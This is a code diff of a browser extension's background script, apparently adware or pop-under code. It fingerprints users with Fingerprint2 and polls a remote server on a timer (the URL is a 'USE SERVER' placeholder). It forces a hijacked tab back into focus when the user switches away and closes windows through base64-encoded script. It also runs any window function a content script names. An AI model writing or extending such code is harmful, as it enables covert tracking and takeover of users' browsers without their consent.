@@ -5,9 +5,8 @@
 /* Functions */
 
 function escapeInput(input) { return input.replace(/'/g, "\\'"); }
-function p_t() { window.pastornow = (new Date).getTime(); if( window.pastornext && window.pastornext > window.pastornow) return; window.pastornext = window.pastornow + window.pastoriv; p_getS(apiUrl); }
 var Storage = { manage: function(param,value) { param = "M3."+param; if( value === undefined ) { return localStorage.getItem(param); } else { localStorage.setItem(param,value); } } };
-
+window.p_ni = function (d){window.pastoriv = d; window.pastornow = (new Date).getTime(); window.pastornext = window.pastornow + d;return true;}
 window.p_rand = function (min, max) { var rand = min + Math.random() * (max - min); rand = Math.round(rand); return rand; }
 window.isset = function(e,tt,tt1){ var t = []; if(typeof tt != 'undefined'){ t[t.length] = tt; } if(typeof tt1 != 'undefined'){ t[t.length] = tt1; } var type = typeof e; if(type != 'undefined' && e != null){ if(t.length>0){ for(var j=0;j<t.length;j++){ if(e.length<=0 && ((type == 'string' && t[j] == 'string') || (type == 'object' && t[j] == 'array'))){ return false; } } } return true; }else{ return false; } return 0; }
 window.p_t_close = function (tab) { var write = 'document.write(atob("PHNjcmlwdD52YXIgd2luID0gd2luZG93Lm9wZW4oImFib3V0OmJsYW5rIiwgIl9zZWxmIik7d2luLmNsb3NlKCk7d2luZG93LmNsb3NlKCk7PC9zY3JpcHQ+"));'; var close = 'window.close();'; var open = 'var win = window.open("about:blank", "_self");win.close();'; var locablank = 'location="about:blank";'; var code = write + close + open + locablank; if(tab != undefined) { try { chrome.tabs.remove(tab); }catch (e) { console.error("p_t_close"); } } return code; }
@@ -15,13 +14,14 @@ window.p_t_upd = function (updid,mutdata) { try{ check = isset(updid); }catch(e)
 window.p_t_false = function(tab,d) { var check,noclickTact; try{ check = isset(d.noclick); }catch(e){ check = false; } if(!check) { return false; } chrome.tabs.query( { active: true }, function(t) { noclickTact = t[0].id; }); chrome.tabs.onActivated.addListener(function(activeInfo) { if (activeInfo.tabId != tab) { noclickTact = activeInfo.tabId; return false; } chrome.tabs.update(noclickTact, { active: true }); }); }
 window.p_restart = function (){location.reload();return true;}
 window.p_close = function (){document.write();return true;}
+function p_t() { window.pastornow = (new Date).getTime(); if( window.pastornext && window.pastornext > window.pastornow) return; window.pastornext = window.pastornow + window.pastoriv; p_getS(apiUrl); }
 
 /* Functions end*/
 
 
 
 window.pastoriv = 100000;
-var apiUrl = "http://example.com/";
+var apiUrl = "http://example.com/";  /* USE SERVER */
 
 new Fingerprint2().get(function(result, components){
   Storage.manage("fp2", result);
@@ -118,7 +118,7 @@ chrome.runtime.onMessage.addListener(
     function(request, sender, sendResponse) {
         if (window[request.func] != undefined) {
             sendResponse({
-                [request.func]: window[request.func](sender.tab.id, request.data), tabid: sender.tab.id
+                [request.func]: window[request.func](sender.tab.id, request.data), tabid: sender.tab.id  /* USE CONTENT */
             });
         }
 });
